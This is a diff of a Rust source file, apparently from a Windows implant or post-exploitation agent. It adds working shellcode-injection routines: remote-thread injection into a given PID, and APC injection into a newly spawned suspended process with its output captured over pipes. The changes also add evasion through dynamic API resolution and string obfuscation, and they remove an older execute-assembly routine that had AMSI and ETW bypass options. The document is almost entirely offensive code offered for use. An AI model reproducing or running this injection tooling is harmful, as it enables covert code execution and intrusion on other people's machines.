@@ -1,15 +1,47 @@
+#![allow(non_snake_case)]
 extern crate winapi;
 
-use std::os::windows::process::CommandExt;
-use std::time::Duration;
-use std::thread;
-use std::thread::sleep;
+use std::{
+    io::{
+        Error,
+        ErrorKind::BrokenPipe,
+        Result,
+    },
+    mem::{size_of, transmute},
+    sync::mpsc::{channel, Receiver},
+    thread,
+    time::Duration,
+};
 
-use winapi::ctypes::c_void;
+use winapi::{
+    ctypes::c_void,
+    shared::{
+        ntdef::{HANDLE, TRUE},
+        minwindef::{DWORD, LPVOID},
+    },
+    um::{
+        fileapi::ReadFile,
+        minwinbase::{SECURITY_ATTRIBUTES, STILL_ACTIVE},
+        processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW},
+        winbase::{CREATE_NO_WINDOW, CREATE_SUSPENDED, HANDLE_FLAG_INHERIT},
+        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS},
+    },
+};
+use dynamic_winapi::um::{
+    handleapi::{CloseHandle, SetHandleInformation},
+    memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory},
+    namedpipeapi::CreatePipe,
+    processthreadsapi::{
+        CreateProcessW, CreateRemoteThreadEx, GetExitCodeThread, OpenProcess,
+        QueueUserAPC, ResumeThread,
+    },
+};
+
+use crate::stdlib::get_wide;
 
 pub fn process_injection(args: Vec<&str>) -> String {
     if args.len() < 2 {
-        return "please specify PID".to_string()
+        return obfstr::obfstr!("please specify PID").to_string()
     }
 
     let pid = match args[1].parse::<u32>() {
@@ -21,22 +53,22 @@ pub fn process_injection(args: Vec<&str>) -> String {
     let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 
 
     // get process handle
-    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
-        winapi::um::winnt::PROCESS_ALL_ACCESS,
+    let handle = unsafe {OpenProcess().unwrap()(
+        PROCESS_ALL_ACCESS,
         0x01,
         pid
     )};
 
     // alloc payload
-    let addr_shellcode = unsafe {winapi::um::memoryapi::VirtualAllocEx(
+    let addr_shellcode = unsafe {VirtualAllocEx().unwrap()(
         handle,
-        std::ptr::null_mut(),
+        0 as _,
         shellcode.len(),
-        winapi::um::winnt::MEM_COMMIT,
-        winapi::um::winnt::PAGE_READWRITE
+        MEM_COMMIT,
+        PAGE_READWRITE
     )};
     let mut ret_len: usize = 0;
-    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
+    let _ = unsafe {WriteProcessMemory().unwrap()(
         handle,
         addr_shellcode,
         shellcode_ptr,
@@ -46,195 +78,240 @@ pub fn process_injection(args: Vec<&str>) -> String {
 
     // protect and execute
     let mut old_protect: u32 = 0;
-    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
+    let _ = unsafe {VirtualProtectEx().unwrap()(
         handle,
         addr_shellcode,
         shellcode.len(),
-        winapi::um::winnt::PAGE_EXECUTE_READ,
+        PAGE_EXECUTE_READ,
         &mut old_protect
     )};
-    let _ = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
+    let _ = unsafe {CreateRemoteThreadEx().unwrap()(
         handle,
-        std::ptr::null_mut(),
-        0,
-        std::mem::transmute(addr_shellcode),
         0 as _,
         0,
-        std::ptr::null_mut(),
+        transmute(addr_shellcode),
+        0 as _,
+        0,
+        0 as _,
         0 as _
     )};
 
-    "success".to_string()
+    obfstr::obfstr!("success").to_string()
 }
 
-pub fn execute_assembly(args: Vec<&str>) -> String {
-    if args.len() < 7 {
+struct HandleSend {
+    handle: *mut c_void,
+}
+
+unsafe impl Send for HandleSend {}
+
+pub fn execute_shellcode(args: Vec<&str>) -> String {
+    if args.len() < 2 {
         return "".to_string()
     }
 
     // extract arguments
-    let assembly_b64 = args[1];
-    let assembly = base64::decode(assembly_b64).unwrap();
-    let hosting_dll_b64 = args[2];
-    let mut hosting_dll = base64::decode(hosting_dll_b64).unwrap();
-    let hosting_dll_ptr: *mut c_void = hosting_dll.as_mut_ptr() as *mut c_void; 
-    let process = args[3];
-    let amsi = match args[4].parse::<bool>() {
-        Err(e)  => return e.to_string(),
-        Ok(i) => i,
-    };
-    let etw = match args[5].parse::<bool>() {
-        Err(e)  => return e.to_string(),
-        Ok(i) => i,
-    };
-    let offset_u64 = 0x000010B0;
-    let params = args[6..].join(" ");
-    let mut output_vec: Vec<String> = Vec::new();
-    
-    // spawn suspended process
-    let cmd = std::process::Command::new(process)
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW | winapi::um::winbase::CREATE_SUSPENDED)
-        .spawn()
-        .unwrap();
-    let pid = cmd.id();
+    let process = args[1];
+    let shellcode_b64 = args[2];
+    let mut shellcode = base64::decode(shellcode_b64).unwrap();
+    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 
 
-    // get output
-    let (tx, rx) = std::sync::mpsc::channel::<String>();
+    // dynamically resolve required functions
+    let CreatePipe = CreatePipe().unwrap();
+    let SetHandleInformation = SetHandleInformation().unwrap();
+    let CreateProcessW = CreateProcessW().unwrap();
+    let QueueUserAPC = QueueUserAPC().unwrap();
+    let CloseHandle = CloseHandle().unwrap();
+    let GetExitCodeThread = GetExitCodeThread().unwrap();
+    let ResumeThread = ResumeThread().unwrap();
+
+    let mut std_in_r: HANDLE = 0 as _;
+    let mut std_in_w: HANDLE = 0 as _;
+    let mut std_out_r: HANDLE = 0 as _;
+    let mut std_out_w: HANDLE = 0 as _;
+    // sec attributes
+    let mut sa = SECURITY_ATTRIBUTES {
+        nLength: size_of::<SECURITY_ATTRIBUTES>() as _,
+        lpSecurityDescriptor: 0 as _,
+        bInheritHandle: 1,
+    };
+    // create pipes
+    let _ = unsafe { CreatePipe(&mut std_in_r, &mut std_in_w, &mut sa, 0) };
+    let _ = unsafe { SetHandleInformation(std_in_w, HANDLE_FLAG_INHERIT, 0) };
+    let _ = unsafe { CreatePipe(&mut std_out_r, &mut std_out_w, &mut sa, 0) };
+    let _ = unsafe { SetHandleInformation(std_out_r, HANDLE_FLAG_INHERIT, 0) };
+
+    let mut si = STARTUPINFOW{
+        cb: size_of::<STARTUPINFOW>() as DWORD,
+        lpReserved: 0 as _,
+        lpDesktop: 0 as _,
+        lpTitle: 0 as _,
+        dwX: 0,
+        dwY: 0,
+        dwXSize: 0,
+        dwYSize: 0,
+        dwXCountChars: 0,
+        dwYCountChars: 0,
+        dwFillAttribute: 0,
+        dwFlags: 0x00000100,
+        wShowWindow: 1,
+        cbReserved2: 0,
+        lpReserved2: 0 as _,
+        hStdInput: std_in_r,
+        hStdOutput: std_out_w,
+        hStdError: std_out_w,
+    };
+    let mut pi = PROCESS_INFORMATION{
+        hProcess: 0 as _,
+        hThread: 0 as _,
+        dwProcessId: 0,
+        dwThreadId: 0,
+    };
+
+
+    // read shellcode output in thread
+    let mut out_buf: Vec<u8> = Vec::new();
+    let out_string: String;
+    let (tx, rx) = channel::<String>();
+    let (tx_kill, rx_kill) = channel::<bool>();
+    let tmp_handle = HandleSend {
+        handle: std_out_r
+    };
+
     thread::spawn(move || {
-        match cmd.wait_with_output() {
-            Err(e)      => tx.send(format!("{}", e)).unwrap(),
-            Ok(output)  => { tx.send(format!("{}{}", 
-                String::from_utf8(output.stdout).unwrap(), 
-                String::from_utf8(output.stderr).unwrap()))
-                .unwrap()
-            },
-        };
+        let ret = read_from_pipe(tmp_handle.handle, &mut out_buf, &rx_kill);
+        match ret {
+            Ok(_) => tx.send(String::from_utf8(out_buf).unwrap()).unwrap(),
+            Err(_) => tx.send(obfstr::obfstr!("error reading from pipe").to_string()).unwrap(),
+        }
     });
 
-    // get process handle
-    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
-        winapi::um::winnt::PROCESS_ALL_ACCESS,
-        0x01,
-        pid
-    )};
-
-    // construct assembly payload
-    // assembly size:   4 bytes
-    // params size:     4 bytes
-    // AMSI bool:       1 byte
-    // ETW bool:        1 byte
-    // parameter bytes
-    // assembly bytes
-    let mut payload: Vec<u8> = Vec::new();
-    // assembly size
-    let assembly_len_byte_array: [u8; 4] = unsafe {std::mem::transmute((assembly.len() as u32).to_le())};
-    payload.extend_from_slice(&assembly_len_byte_array);
-    // params size
-    let params_len_byte_array: [u8; 4] = unsafe {std::mem::transmute(((params.len() + 1 as usize) as u32).to_le())};
-    payload.extend_from_slice(&params_len_byte_array);
-    // AMSI
-    if amsi {
-        payload.extend_from_slice(&[0x01]);
-    } else {
-        payload.extend_from_slice(&[0x00]);
-    }
-    // ETW
-    if etw {
-        payload.extend_from_slice(&[0x01]);
-    } else {
-        payload.extend_from_slice(&[0x00]);
-    }
-    // parameters
-    payload.extend_from_slice(params.as_bytes());
-    payload.extend_from_slice(&[0x00]);
-    payload.extend_from_slice(&assembly);
-    let payload_ptr: *mut c_void = payload.as_mut_ptr() as *mut c_void; 
-
-    // alloc HostingCLRx64.dll
-    let addr_hosting_dll = unsafe{winapi::um::memoryapi::VirtualAllocEx(
-        handle,
+    // spawn suspended process
+    let _ = unsafe { CreateProcessW(
         0 as _,
-        hosting_dll.len(),
-        winapi::um::winnt::MEM_COMMIT,
-        winapi::um::winnt::PAGE_READWRITE
+        get_wide(process).as_mut_ptr(),
+        0 as _,
+        0 as _,
+        TRUE as _,
+        CREATE_NO_WINDOW | CREATE_SUSPENDED,
+        0 as _,
+        0 as _,
+        &mut si,
+        &mut pi,
     )};
-    let mut ret_len: usize = 0;
-    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
-        handle,
-        addr_hosting_dll,
-        hosting_dll_ptr,
-        hosting_dll.len(),
-        &mut ret_len
-    )};
+
+    let handle = pi.hProcess;
 
     // alloc payload
-    let addr_assembly = unsafe{winapi::um::memoryapi::VirtualAllocEx(
+    let addr_shellcode = unsafe {VirtualAllocEx().unwrap()(
         handle,
-        std::ptr::null_mut(),
-        payload.len(),
-        winapi::um::winnt::MEM_COMMIT,
-        winapi::um::winnt::PAGE_READWRITE
+        0 as _,
+        shellcode.len(),
+        MEM_COMMIT,
+        PAGE_READWRITE
     )};
-    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
+    let mut ret_len: usize = 0;
+    let _ = unsafe {WriteProcessMemory().unwrap()(
         handle,
-        addr_assembly,
-        payload_ptr,
-        payload.len(),
+        addr_shellcode,
+        shellcode_ptr,
+        shellcode.len(),
         &mut ret_len
     )};
 
-    // protect and execute
+    // protect
     let mut old_protect: u32 = 0;
-    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
+    let _ = unsafe {VirtualProtectEx().unwrap()(
         handle,
-        addr_hosting_dll,
-        hosting_dll.len(),
-        winapi::um::winnt::PAGE_EXECUTE_READ,
+        addr_shellcode,
+        shellcode.len(),
+        PAGE_EXECUTE_READ,
         &mut old_protect
     )};
-    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
-        handle,
-        addr_assembly,
-        payload.len(),
-        winapi::um::winnt::PAGE_EXECUTE_READ,
-        &mut old_protect
+
+    // Queue shellcode for execution and resume thread
+    let _ = unsafe { QueueUserAPC(
+        Some(transmute(addr_shellcode)),
+        pi.hThread,
+        0 as _
     )};
-    let mut lp_thread_id: u32 = 0;
-    let thread_start_addr = unsafe { addr_hosting_dll.offset(offset_u64) };
-    let thread_handle = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
-        handle,
-        std::ptr::null_mut(),
-        0,
-        std::mem::transmute(thread_start_addr),
-        addr_assembly,
-        0,
-        std::ptr::null_mut(),
-        &mut lp_thread_id
-    )};
+    let _ = unsafe { ResumeThread(pi.hThread) };
+
+    // close handles
+    let _ = unsafe { CloseHandle(handle); };
+    let _ = unsafe { CloseHandle(std_out_w); };
+    let _ = unsafe { CloseHandle(std_in_r); };
 
     // wait for thread to finish
     loop {
         let mut ret_code: u32 = 0;
-        let _ = unsafe {winapi::um::processthreadsapi::GetExitCodeThread(
-            thread_handle,
+        let _ = unsafe {GetExitCodeThread(
+            pi.hThread,
             &mut ret_code
         )};
-        if ret_code == winapi::um::minwinbase::STILL_ACTIVE {
-            sleep(Duration::from_secs(1));
+        if ret_code == STILL_ACTIVE {
+            continue;
         } else {
-            let _ = unsafe {winapi::um::processthreadsapi::TerminateProcess(handle, 0)};
+            let _ = tx_kill.send(true);
             match rx.recv() {
-                Ok(output)  => output_vec.push(output),
-                Err(_)      => output_vec.push("could not get output".to_string()),
+                Ok(output)  => { 
+                    out_string = output; 
+                    break; 
+                },
+                Err(_)      => { 
+                    out_string = obfstr::obfstr!("could not get output").to_string(); 
+                    break; 
+                },
             }
-            break
         }
     }
+    out_string
+}
 
-    // close process handle
-    let _ = unsafe { winapi::um::handleapi::CloseHandle(handle); };
+pub trait IsZero {
+    fn is_zero(&self) -> bool;
+}
 
-    output_vec.join("\n")
+macro_rules! impl_is_zero {
+    ($($t:ident)*) => ($(impl IsZero for $t {
+        fn is_zero(&self) -> bool {
+            *self == 0
+        }
+    })*)
+}
+
+impl_is_zero! { i8 i16 i32 i64 isize u8 u16 u32 u64 usize }
+
+pub fn cvt<I: IsZero>(i: I) -> Result<I> {
+    if i.is_zero() { Err(Error::last_os_error()) } else { Ok(i) }
+}
+
+pub fn read_from_pipe(handle: HANDLE, buf: &mut Vec<u8>, kill: &Receiver<bool>) -> Result<usize> {
+    let mut total_read = 0;
+    let kill = kill.to_owned();
+    let mut complete = false;
+    loop {
+        let mut read = 0;
+        let mut tmp_buf = [0; 10001];
+        let res = cvt(unsafe {
+            ReadFile(handle, tmp_buf.as_mut_ptr() as LPVOID, 10001 as _, &mut read, 0 as _)
+        });
+
+        match res {
+            Ok(_) => {
+                buf.extend_from_slice(&tmp_buf);
+                total_read = total_read + read;
+            },
+            Err(ref e) if e.kind() == BrokenPipe => break,
+            Err(_) => break,
+        }
+        if complete {
+            continue;
+        }
+        match kill.recv_timeout(Duration::from_millis(100)) {
+            Ok(_) => { complete = true; },
+            Err(_) => {},
+        }
+    }
+    Ok(total_read as usize)
 }
